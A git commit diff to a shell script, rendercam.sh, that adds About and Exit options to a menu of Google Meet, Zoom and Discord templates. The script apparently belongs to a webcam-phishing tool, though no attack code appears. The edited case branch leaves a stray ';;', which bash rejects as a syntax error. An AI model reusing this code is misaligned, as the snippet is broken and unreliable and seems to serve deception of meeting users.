afd6f6a13964c7e62d9380332618b6a36b507e1e
render437 <fehrenbacherb07@gmail.com>
2026-01-15 11:56:34 -0600

    Update rendercam.sh

--- rendercam.sh
+++ rendercam.sh
@@ -715,6 +715,8 @@ select_template() {
     printf "\n\e[1;92m[01]\e[0m\e[1;93m Google Meet\e[0m\n"
     printf "\e[1;92m[02]\e[0m\e[1;93m Zoom\e[0m\n"
     printf "\e[1;92m[03]\e[0m\e[1;93m Discord\e[0m\n"
+    printf "\e[1;92m[99]\e[0m\e[1;93m About\e[0m\n"
+    printf "\e[1;92m[00]\e[0m\e[1;93m Exit\e[0m\n"
 
     default_option_template=1
     read -p $'\n\e[1;92m[+] Choose a template: [Default is 1] \e[0m' option_tem
@@ -733,10 +735,13 @@ select_template() {
             printf "\n\e[1;92m[+] Starting Discord Template...\e[0m\n"
             # start_discord
             ;;
+        99)
+            about;;
+        0 | 00 )
+            msg_exit;;
         *)
-            printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
-            sleep 1
-            select_template
+            echo -ne "\n${RED} Invalid Option, Try Again..."
+            { sleep 1; select_template; };;
             ;;
     esac
 }
